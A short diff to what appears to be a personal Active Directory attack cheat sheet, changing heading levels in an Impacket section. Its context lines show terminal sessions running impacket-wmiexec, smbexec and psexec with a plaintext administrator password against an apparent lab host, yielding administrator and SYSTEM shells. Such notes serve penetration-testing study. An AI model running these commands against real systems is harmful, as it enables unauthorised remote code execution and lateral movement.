@@ -789,6 +789,7 @@ Crack with hashcat
 
 ## Impacket
 
+### wmiexec
 	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
 	└─$ /usr/bin/impacket-wmiexec valhalla/administrator:Pass123\!@192.168.200.100                                                                 1 ⨯ 1 ⚙
 	Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
@@ -799,7 +800,7 @@ Crack with hashcat
 	C:\>whoami
 	valhalla\administrator
 
-## smbexec
+### smbexec
 
 	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
 	└─$ /usr/bin/impacket-smbexec valhalla/administrator:Pass123\!@192.168.200.100                                                                     1 ⚙
@@ -810,7 +811,7 @@ Crack with hashcat
 	nt authority\system
 
 
-## psexec
+### psexec
 
 	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
 	└─$ /usr/bin/impacket-psexec valhalla/administrator:Pass123\!@192.168.200.100                                                                  1 ⨯ 1 ⚙
